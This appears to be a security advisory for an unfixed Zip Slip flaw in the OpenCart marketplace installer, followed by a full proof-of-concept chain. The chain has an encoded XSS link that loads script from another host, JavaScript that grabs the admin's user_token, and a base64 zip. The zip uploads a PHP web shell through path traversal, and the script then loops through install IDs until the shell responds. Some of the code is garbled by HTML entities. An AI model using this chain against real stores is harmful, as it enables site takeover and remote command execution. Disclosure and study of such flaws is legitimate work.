## How to fix?

There is no fixed version for `opencart/opencart`.

## Overview

[opencart/opencart](https://packagist.org/packages/opencart/opencart) is a shopping cart system

Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip). A Zip Slip issue was identified via the marketplace installer due to improper sanitization of the target path, allowing files within a malicious archive to traverse the filesystem and be extracted to arbitrary locations. An attacker can create arbitrary files in the web root of the application and overwrite other existing files by exploiting this vulnerability.

## PoC

Combining this with one of the previously identified XSS issues within the admin functionality, the full exploit chain would be as follows:

Attacker sends URL including XSS payload to admin: `https://mywebstore.com/admin/index.php?route=common/filemanager.list&directory=demo%2522%253E%253Cscript%2Bsrc%253D%2522http%253A%252F%252Flocalhost%253A8000%252Foc.js%2522%253E%253C%252Fscript%253E%253Cinput%2Btype%253D%2522hidden`

Admin is prompted to login. Upon login, they are redirected to the above URL, including a `user_token` generated at login

The XSS payload includes a Javascript file hosted on another domain, as below - in the example payload it is `http://localhost:8000/oc.js`:

```
// Store host
let host = 'https://mywebstore.com'
// Base64 encoded content of the malicious extension zip
let extB64 = 'UEsDBBQAAAAAAKcGglcavkeoQwAAAEMAAAAMAAAALi4vLi4vb2MucGhwPD9waHAgCgppZiAoaXNzZXQoJF9HRVRbJ2MnXSkpIHsKICAgIGVjaG8gc3lzdGVtKCRfR0VUWydjJ10pOwp9Cgo/PlBLAwQUAwAACABojIFXziDSgW4AAACKAAAADAAAAGluc3RhbGwuanNvbi2MMQ7CMAxF957CeEYprN0QCwuHiCKjRhCnSpyGqurdWysd/3tPf+0AkG0gHADfC9BfiLOPjFc1MyUdKu/m1pgtMsak6OECwTOmyTTz8/xVPopMeej7WquxR2NcDK3wnCUVJ+fny84En8IX7LYdUEsBAhQDFAAAAAAApwaCVxq+R6hDAAAAQwAAAAwAAAAAAAAAAAAAALSBAAAAAC4uLy4uL29jLnBocFBLAQI/AxQDAAAIAGiMgVfOINKBbgAAAIoAAAAMACQAAAAAAAAAIICkgW0AAABpbnN0YWxsLmpzb24KACAAAAAAAAEAGACAy2m+fCTaAQDBQ2aeJNoBAAXQMZ4k2gFQSwUGAAAAAAIAAgCYAAAABQEAAAAA'

async function poc(token) {
    console.log(Got user token :) [${token}])

```
let uploadEndpoint = `${host}/admin/index.php?route=marketplace/installer.upload&amp;user_token=${token}`;

let blob = new Blob([Uint8Array.from(atob(extB64), c =&gt; c.charCodeAt(0))], {type: &#39;application/octet-stream&#39;});
let form = new FormData();
form.append(&quot;file&quot;, blob, &quot;acmeext.ocmod.zip&quot;);

let response = await fetch(uploadEndpoint, {
    method: &quot;POST&quot;,
    mode: &quot;no-cors&quot;,
    body: form,
});
let json = await response.json()
console.log(`Got upload response: ${JSON.stringify(json)}`)

if (json.hasOwnProperty(&quot;success&quot;)) {
    console.log(&#39;Uploaded extension, attempting to install..&#39;);
    let installId = 5;
    let installCheckEndpoint = `${host}/oc.php`;
    let status = -1;
    while ((status = (await fetch(installCheckEndpoint)).status) != 200 &amp;&amp; installId &lt; 50) {
        console.log(`Attempting install with id: ${installId}`)
        let installEndpoint = `${host}/admin/index.php?route=marketplace/installer.install&amp;extension_install_id=${installId}&amp;user_token=${token}`;
        let response = await fetch(installEndpoint);
        let json = await response.json()
        console.log(`Got install response with id [${installId}]: ${JSON.stringify(json)}`)
        installId++;
    }

    console.log(status == 200 ? &quot;:)&quot; : &quot;:(&quot;)
} else {
    console.log(&#39;Failed to upload extension :(&#39;);
}

```

}

// Get the user token
let userToken = new URLSearchParams(window.location.search).get("user_token") ?? null;
if (userToken) {
    // Only continue with a user token
    poc(userToken)
} else {
    console.log('Couldnt get user token :(');
}

```
